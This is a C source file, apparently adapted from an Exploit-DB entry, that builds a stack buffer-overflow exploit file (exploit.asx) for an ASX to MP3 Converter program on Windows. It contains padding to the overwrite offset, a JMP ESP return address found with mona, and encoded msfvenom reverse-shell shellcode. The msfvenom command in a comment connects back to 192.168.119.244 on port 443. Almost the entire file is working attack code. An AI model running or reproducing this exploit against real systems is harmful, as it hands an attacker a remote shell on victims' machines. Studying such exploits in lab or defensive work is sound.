/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3
Modified to work on Windows 10 by Neosteve
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    // Find exact offset with msf-pattern_create -l 255 and then msf-pattern_offset -l 255 -q 30694139
    // 239 offset
    char overwrite_offset[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    
    // Found this using !mona find -s "\xff\xe4" -m MSA2Mutility03.dll
    // 0x1000986d or 0x1003789d
    // This one has a bad char \x00
    //char retn[] = "\x6d\x98\x00\x10"; //0x1000986d
    char retn[] = "\x9d\x78\x03\x10"; //0x1003789d

    // msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.244 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a\x10"
    char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled	
"\xdb\xcc\xd9\x74\x24\xf4\xbf\x5e\xe7\xd3\xb4\x5a\x29\xc9\xb1"
"\x52\x31\x7a\x17\x83\xea\xfc\x03\x24\xf4\x31\x41\x24\x12\x37"
"\xaa\xd4\xe3\x58\x22\x31\xd2\x58\x50\x32\x45\x69\x12\x16\x6a"
"\x02\x76\x82\xf9\x66\x5f\xa5\x4a\xcc\xb9\x88\x4b\x7d\xf9\x8b"
"\xcf\x7c\x2e\x6b\xf1\x4e\x23\x6a\x36\xb2\xce\x3e\xef\xb8\x7d"
"\xae\x84\xf5\xbd\x45\xd6\x18\xc6\xba\xaf\x1b\xe7\x6d\xbb\x45"
"\x27\x8c\x68\xfe\x6e\x96\x6d\x3b\x38\x2d\x45\xb7\xbb\xe7\x97"
"\x38\x17\xc6\x17\xcb\x69\x0f\x9f\x34\x1c\x79\xe3\xc9\x27\xbe"
"\x99\x15\xad\x24\x39\xdd\x15\x80\xbb\x32\xc3\x43\xb7\xff\x87"
"\x0b\xd4\xfe\x44\x20\xe0\x8b\x6a\xe6\x60\xcf\x48\x22\x28\x8b"
"\xf1\x73\x94\x7a\x0d\x63\x77\x22\xab\xe8\x9a\x37\xc6\xb3\xf2"
"\xf4\xeb\x4b\x03\x93\x7c\x38\x31\x3c\xd7\xd6\x79\xb5\xf1\x21"
"\x7d\xec\x46\xbd\x80\x0f\xb7\x94\x46\x5b\xe7\x8e\x6f\xe4\x6c"
"\x4e\x8f\x31\x22\x1e\x3f\xea\x83\xce\xff\x5a\x6c\x04\xf0\x85"
"\x8c\x27\xda\xad\x27\xd2\x8d\x11\x1f\xab\xb9\xfa\x62\x53\x43"
"\x40\xeb\xb5\x29\xa6\xba\x6e\xc6\x5f\xe7\xe4\x77\x9f\x3d\x81"
"\xb8\x2b\xb2\x76\x76\xdc\xbf\x64\xef\x2c\x8a\xd6\xa6\x33\x20"
"\x7e\x24\xa1\xaf\x7e\x23\xda\x67\x29\x64\x2c\x7e\xbf\x98\x17"
"\x28\xdd\x60\xc1\x13\x65\xbf\x32\x9d\x64\x32\x0e\xb9\x76\x8a"
"\x8f\x85\x22\x42\xc6\x53\x9c\x24\xb0\x15\x76\xff\x6f\xfc\x1e"
"\x86\x43\x3f\x58\x87\x89\xc9\x84\x36\x64\x8c\xbb\xf7\xe0\x18"
"\xc4\xe5\x90\xe7\x1f\xae\xb1\x05\xb5\xdb\x59\x90\x5c\x66\x04"
"\x23\x8b\xa5\x31\xa0\x39\x56\xc6\xb8\x48\x53\x82\x7e\xa1\x29"
"\x9b\xea\xc5\x9e\x9c\x3e";

    int buffer_size = strlen(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size);

    strcpy(buffer, overwrite_offset);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    memset(buffer + buffer_size - 1, 0x00, 1);

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer); 
    fclose(fp);

    return 0;

}